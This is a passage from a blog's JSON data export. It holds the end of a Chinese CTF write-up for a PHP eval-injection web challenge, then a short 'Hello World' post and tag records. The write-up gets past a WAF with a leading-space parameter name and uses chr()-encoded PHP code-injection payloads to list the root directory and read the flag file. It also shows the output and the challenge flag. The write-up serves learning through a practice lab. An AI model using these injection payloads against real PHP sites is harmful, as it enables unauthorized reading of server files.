$blackitem . <span class=\"string\">'/m'</span>, $str)) &#123;    </span><br><span class=\"line\">                        <span class=\"keyword\">die</span>(<span class=\"string\">\"what are you want to do?\"</span>);<span class=\"comment\">//如果包含黑名单中的字符，程序退出</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"string\">'echo '</span>.$str.<span class=\"string\">';'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"0x03-开始操作\"><a href=\"#0x03-开始操作\" class=\"headerlink\" title=\"0x03 开始操作\"></a>0x03 开始操作</h3><p>传入<code>1+1</code> 显示<code>403 Forbidden</code> 传入<code>1%2b1</code>就可以。必须传入urldecode后。查看<code>phpinfo()</code>，也是<code>403 Forbidden</code>，利用PHP自动解析函数<code>parser_str()</code>绕过，纤细介绍查看<a href=\"https://www.freebuf.com/articles/web/213359.html\" target=\"_blank\" rel=\"noopener\">参考连接</a>。</p>\n<p>扫描目录使用<code>scandir()</code>因为<code>/ &#39;  &quot;</code>被过滤无法直接使用<code>/</code>，使用<code>chr()</code>转换payload= <code>?+num=print_r(scandir(chr(47)))</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; .dockerenv [3] &#x3D;&gt; bin [4] &#x3D;&gt; boot [5] &#x3D;&gt; dev [6] &#x3D;&gt; etc [7] &#x3D;&gt; f1agg [8] &#x3D;&gt; home [9] &#x3D;&gt; lib [10] &#x3D;&gt; lib64 [11] &#x3D;&gt; media [12] &#x3D;&gt; mnt [13] &#x3D;&gt; opt [14] &#x3D;&gt; proc [15] &#x3D;&gt; root [16] &#x3D;&gt; run [17] &#x3D;&gt; sbin [18] &#x3D;&gt; srv [19] &#x3D;&gt; start.sh [20] &#x3D;&gt; sys [21] &#x3D;&gt; tmp [22] &#x3D;&gt; usr [23] &#x3D;&gt; var ) 1</span><br></pre></td></tr></table></figure>\n\n<p>使用PHP内置函数获<code>file_get_contents()</code>获取文件内容payload=<code>?+num=printf(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;d09c31b7-d1a1-45a2-b35b-65452a1335ef&#125; 43</span><br></pre></td></tr></table></figure>"},{"title":"Hello World","date":"2019-12-19T12:49:28.000Z","_content":"\n第一次弄好自己的博客，之前都是在onenote上写的，现在准备慢慢向博客转移\n\n","source":"_posts/hello-world.md","raw":"---\ntitle: Hello World\ndate: 2019-12-19 20:49:28\n---\n\n第一次弄好自己的博客，之前都是在onenote上写的，现在准备慢慢向博客转移\n\n","slug":"hello-world","published":1,"updated":"2019-12-27T03:47:02.604Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck4nmczct0005207e50j0hbm1","content":"<p>第一次弄好自己的博客，之前都是在onenote上写的，现在准备慢慢向博客转移</p>\n","site":{"data":{}},"excerpt":"","more":"<p>第一次弄好自己的博客，之前都是在onenote上写的，现在准备慢慢向博客转移</p>\n"}],"PostAsset":[],"PostCategory":[],"PostTag":[{"post_id":"ck4nmczc90000207eemtn5tbt","tag_id":"ck4nmczcr0004207e0n775nfv","_id":"ck4nmczdb000a207e83djebug"},{"post_id":"ck4nmczc90000207eemtn5tbt","tag_id":"ck4nmczcw0006207e5ou0hec9","_id":"ck4nmczdc000b207e8dzk75r3"},{"post_id":"ck4nmczc90000207eemtn5tbt","tag_id":"ck4nmczd30007207eah23clnr","_id":"ck4nmczdd000d207e4f8v5ahy"},{"post_id":"ck4nmczc90000207eemtn5tbt","tag_id":"ck4nmczd70008207e5yg10f01","_id":"ck4nmczde000e207e96j20hbz"},{"post_id":"ck4nmczco0002207e6ffo6620","tag_id":"ck4nmczcr0004207e0n775nfv","_id":"ck4nmczdg000h207ehnyy4fad"},{"post_id":"ck4nmczco0002207e6ffo6620","tag_id":"ck4nmczdd000c207ee3qsghnl","_id":"ck4nmczdh000i207eav0f6pc0"},{"post_id":"ck4nmczco0002207e6ffo6620","tag_id":"ck4nmczd30007207eah23clnr","_id":"ck4nmczdi000j207e8q8wfdc9"},{"post_id":"ck4nmczco0002207e6ffo6620","tag_id":"ck4nmczcw0006207e5ou0hec9","_id":"ck4nmczdi000k207eeso60boi"}],"Tag":[{"name":"ctf","_id":"ck4nmczcr0004207e0n775nfv"},{"name":"buuoj","_id":"ck4nmczcw0006207e5ou0hec9"},{"name":"web","_id":"ck4nmczd30007207eah23clnr"},{"name":"0CTF","_id":"ck4nmczd70008207e5yg10f01"},{"name":"Roarctf","_id":"ck4nmczdd000c207ee3qsghnl"}]}}